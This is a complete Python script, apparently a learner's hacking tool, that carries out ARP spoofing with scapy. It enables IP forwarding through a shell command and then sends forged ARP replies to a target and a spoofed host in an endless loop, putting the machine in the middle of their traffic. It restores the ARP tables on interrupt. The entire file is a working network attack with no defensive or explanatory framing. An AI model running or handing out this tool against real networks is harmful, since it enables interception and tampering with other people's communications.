#!/usr/bin/env python


import scapy.all as scapy
import optparse
import time
import sys
from subprocess import Popen
import subprocess

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad = broadcast / arp_request
    answered , unanswered = scapy.srp(arp_broad , timeout = 1 , verbose = False)
    return answered[0][1].hwsrc

def arp_packet(target_ip , spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2 , pdst=target_ip , hwdst=mac , psrc=spoof_ip)
    scapy.send(packet , verbose = False)


def parse ():
    parser = optparse.OptionParser()
    parser.add_option("-t" , "--iptarget" , dest = "iptarget" , help = "give ip target")
    parser.add_option("-s" , "--spoof" , dest = "spoof" , help = "give ip spoof")
    return parser.parse_args()

def restore(dest_ip , source_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip , hwsrc = src_mac)
    scapy.send(packet, count = 4 , verbose=False)


def enable_port_fwd():
    """
    Enables port forwarding through controller machine.
    """
    print("[+] Enabling port forwarding.")
    cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),


(options,args) = parse()
count = 0
enable_port_fwd()
try:
    while True:
        arp_packet(options.iptarget , options.spoof)
        arp_packet(options.spoof , options.iptarget)
        count += 2
        print("\rpackets sent : " + str(count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt :
    restore(options.iptarget,options.spoof)
    restore(options.spoof , options.iptarget)
    print("[*] Detected ctrl C ... Quitting")

except IndexError:
    print("[!] the computer targeted is off")

